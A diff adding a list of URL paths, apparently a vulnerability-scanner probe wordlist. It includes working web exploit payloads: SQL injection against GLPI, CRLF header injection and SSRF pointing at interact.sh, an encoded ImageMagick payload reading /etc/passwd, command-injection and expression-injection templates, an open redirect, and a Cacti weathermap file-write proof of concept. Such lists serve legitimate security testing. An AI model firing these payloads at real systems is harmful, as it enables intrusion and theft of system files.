@@ -1,0 +1,24 @@
+/cgi-bin/login?LD_DEBUG=files
+/glpi/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1
+/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1
+/cgi-bin/file_transfer.cgi
+/auth/check
+/auth/newpassword
+/cgi-bin/weblogin.cgi?username=admin
+/test.txt%0d%0aSet-Cookie:CRLFInjection=Test%0d%0aLocation:%20interact.sh%0d%0aX-XSS-Protection:0
+/system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ==
+/system/refinery/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ==
+/homeaction.php
+/lab.html?vpath=//interact.sh
+/cgi-bin/admin.cgi?Command=sysCommand&Cmd={{cmd}}
+/scrm/crm/admin
+/openam/ui/PWResetUserValidation
+/OpenAM-11.0.0/ui/PWResetUserValidation
+/ui/PWResetUserValidation
+/js/zimbraMail/share/model/ZmSettings.js
+/login.do?jvar_page_title=<style><foo>Injected Title</foo></style>
+/portal/displayAPSForm.action?debug=command&expression={{first}}*{{second}}
+/%5cgoogle.com/evil.html
+/SecurityGateway.dll?view=login&redirect=true&9OW4L7RSDY=1
+/plugins/weathermap/editor.php?plug=0&mapname=poc.conf&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=46ea1712d4b13b55b3f680cc5b8b54e8&map_legend=Traffic+Load&map_stamp=Created:+%b+%d+%Y+%H:%M:%S&map_linkdefaultwidth=7
+/plugins/weathermap/configs/poc.conf
